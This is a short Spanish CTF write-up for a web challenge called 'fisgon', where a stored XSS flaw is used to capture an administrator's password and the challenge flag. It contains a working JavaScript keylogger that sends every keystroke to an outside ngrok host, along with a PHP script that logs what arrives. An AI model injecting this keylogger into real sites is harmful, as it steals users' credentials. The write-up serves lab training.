# Web 200 fisgon

Necesitamos robar la contraseña del administrador de este sitio, sabemos que constantemente se loggea al sitio, aproximadamente cada 10 minutos, puedes espiarlo y recuperar dicha informacion?

El sitio era vulnerable a XSS persistente, por lo que se incorporó un archivo js para que funcionará como keylogger, siendo el código de js el siguiente

```js
var l = "|";
document.onkeypress = function (e) {
     l += e.key + "|";

     var req = new XMLHttpRequest();
     req.open("GET","https://8fcad6259181.ngrok.io/XSS/saveit.php?letra="+l, true); 			
     req.send(null);
}
```
Y el código de saveit.php sería:

```php
$keylogger = $_GET['letra'];
$fp = fopen('keylogger.txt', 'a+');
fwrite($fp, '' .$keylogger."\r\n");
fclose($fp);
```

De esta manera se capturaron las credenciales del admin, siendo las siguientes:
* admin
* st0r3d?xss?c4n?b3?d4n93r0u$?t0o!

## FLAG
st0r3d?xss?c4n?b3?d4n93r0u$?t0o!